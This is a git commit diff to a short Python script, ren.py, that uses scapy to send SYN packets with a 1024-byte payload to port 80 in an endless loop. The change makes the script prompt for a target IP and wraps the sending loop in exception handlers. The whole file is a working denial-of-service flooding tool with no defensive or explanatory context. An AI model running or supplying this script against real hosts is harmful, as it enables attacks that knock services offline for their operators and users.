345092a1013a61f3f1b5d6f0bd87889fac206790
Parrot Live user <user@localhost.localdomain>
2024-12-03 22:30:45 +0000

    added

--- ren.py
+++ ren.py
@@ -1,10 +1,16 @@
 import sys,os
 from scapy.all import *
-target='192.168.1.5'
+target=input("IP: ")
 port=80
 ip=IP(dst=target)
 tcp=TCP(sport=RandShort(),dport=port,flags="S")
 raw=Raw(b"X"*1024)
 packets=ip/tcp/raw
-send(packets,loop=1,verbose=0)
-print("(+)Flood Sending...")
+try:
+    try:
+        print("(+)Flood Sending...")
+        send(packets,loop=1,verbose=0)
+    except KeyboardInterrupt:
+        pass
+except Exception:
+    pass
